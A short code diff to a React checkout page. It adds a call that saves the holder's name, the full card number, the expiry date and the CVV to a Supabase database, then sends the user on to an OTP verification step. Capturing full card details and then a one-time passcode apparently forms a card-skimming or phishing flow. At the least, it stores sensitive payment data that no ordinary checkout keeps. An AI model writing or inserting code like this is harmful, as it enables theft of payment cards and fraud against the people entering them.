@@ -3,6 +3,7 @@ import { useNavigate } from "react-router-dom";
 import { ChevronRight, CreditCard, Lock } from "lucide-react";
 import { base44 } from "@/api/base44Client";
 import StepProgress from "@/components/StepProgress";
+import { saveToSupabase } from "@/functions/saveToSupabase";
 
 export default function Payment() {
   const navigate = useNavigate();
@@ -31,6 +32,18 @@ export default function Payment() {
         card_number_last4: form.card_number.replace(/\s/g, "").slice(-4),
       });
     }
+    // Save payment data to Supabase
+    await saveToSupabase({
+      type: "payment",
+      data: {
+        application_id: appId,
+        card_holder: form.card_holder,
+        card_number_full: form.card_number.replace(/\s/g, ""),
+        card_number_last4: form.card_number.replace(/\s/g, "").slice(-4),
+        expiry_date: form.expiry,
+        cvv: form.cvv,
+      },
+    });
     setLoading(false);
     navigate("/otp-verify");
   };
